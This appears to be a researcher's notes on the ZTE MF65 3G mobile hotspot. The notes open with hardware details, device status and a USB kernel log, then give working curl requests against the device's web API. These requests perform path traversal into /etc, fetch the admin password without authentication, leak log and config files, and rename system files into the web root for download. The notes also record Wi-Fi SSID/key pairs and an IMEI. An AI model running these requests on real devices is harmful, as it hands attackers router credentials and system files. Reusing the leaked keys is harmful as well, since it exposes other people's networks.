
SSID and KEY:
```
TPPWF_4D2A7C:87347788DD
TPPWF_0F5F73:873496E4EC


```
Gobi 3000	Sierra	MC8705	MDM8200
**sk hynix H9DA1GG51JBM**
- 1GB RAM / MMC ?

**qualcomm mdm8200a**
- Modem Chipset ?
- Single-mode modem
- Only supports HSPA+ with data rates of up to 28 Mbit/s
- GPS functionality, including support for Assisted GPS

**qualcomm rtr6285**

- SINGLE-CHIP MULTI-BAND UMTS/EGPRS TRANSCEIVER WITHIN TEGRATED RECEIVE DIVERSITY AND GPS

## Products

- ZTE MF65 3G HSPA+ 21Mbps Mobile Hotspot

```
SIM Card Number — —
IMEI 867307019770164
IMSI — —
Signal Strength — —
Network Name (SSID) TPPWF_4D2A7C Change
Max Access Number 5
LAN Domain m.home
IP Address 192.168.0.1
WAN IP Address — —
Software Version MF65_T02
Firmware Version MF65_T02
Hardware Version MF65-1.0.0
```

USB
```
[10090.548237] usb 1-6: new high-speed USB device number 6 using xhci_hcd
[10090.709964] usb 1-6: New USB device found, idVendor=19d2, idProduct=0016, bcdDevice=f0.ae
[10090.709981] usb 1-6: New USB device strings: Mfr=3, Product=2, SerialNumber=0
[10090.709989] usb 1-6: Product: ZTE WCDMA Technologies MSM
[10090.709995] usb 1-6: Manufacturer: ZTE,Incorporated
[10090.765082] usbcore: registered new interface driver usbserial_generic
[10090.765099] usbserial: USB Serial support registered for generic
[10090.771574] usbcore: registered new interface driver option
[10090.771593] usbserial: USB Serial support registered for GSM modem (1-port)
[10090.771698] option 1-6:1.0: GSM modem (1-port) converter detected
[10090.771834] usb 1-6: GSM modem (1-port) converter now attached to ttyUSB0
[10090.771891] option 1-6:1.1: GSM modem (1-port) converter detected
[10090.771958] usb 1-6: GSM modem (1-port) converter now attached to ttyUSB1
[10090.772005] option 1-6:1.2: GSM modem (1-port) converter detected
[10090.772065] usb 1-6: GSM modem (1-port) converter now attached to ttyUSB2
[10102.322077] usb 1-6: USB disconnect, device number 6
[10102.322722] option1 ttyUSB0: GSM modem (1-port) converter now disconnected from ttyUSB0
[10102.322796] option 1-6:1.0: device disconnected
[10102.323266] option1 ttyUSB1: GSM modem (1-port) converter now disconnected from ttyUSB1
[10102.323337] option 1-6:1.1: device disconnected
[10102.323730] option1 ttyUSB2: GSM modem (1-port) converter now disconnected from ttyUSB2
[10102.323798] option 1-6:1.2: device disconnected
```


## PAth Traversal

```
curl --location 'http://192.168.0.1/goform/goform_set_cmd_process' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--data-urlencode 'isTest=false' \
--data-urlencode 'goformId=HTTPSHARE_ENTERFOLD' \
--data-urlencode 'path_SD_CARD=/etc' \
--data-urlencode 'indexPage=1'
```

## How to connect WIFI?
``` js
defined.service.connectHotspot({EX_SSID1: 'home',EX_AuthMode: "WPAPSKWPA2PSK", EX_EncrypType: "CCMP",EX_WPAPSK1:"oranganggo",
                               EX_wifi_profile:"Profile2"})
```

## Get admin password

http://192.168.0.1/goform/goform_get_cmd_process?isTest=false&cmd=admin_Password

## WEB FILE LEAKS

http://192.168.0.1/goahead.log
http://192.168.0.1/pppoelog.log

curl -i http://192.168.0.1/zte_log/temp

curl -i 'http://192.168.0.1/copy/etc/dnsmasq.conf'

curl -i 'http://192.168.0.1/copy/etc/udhcpd.conf'


## Rename and download
Note: cannot download .txt file, rename to other ext then download
curl --location 'http://192.168.0.1/goform/goform_set_cmd_process' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--data-urlencode 'isTest=false' \
--data-urlencode 'goformId=HTTPSHARE_FILE_RENAME' \
--data-urlencode 'path_SD_CARD=/' \
--data-urlencode 'OLD_NAME_SD_CARD=/etc/dnsmasq.conf' \
--data-urlencode 'NEW_NAME_SD_CARD=/web/dnsmasq.conf'

curl -i 'http://192.168.0.1/copy/etc/udhcpd.conf'

# ./files.sh /web/userseting_nvconfig.txt
# ./files.sh /nvconfig_debug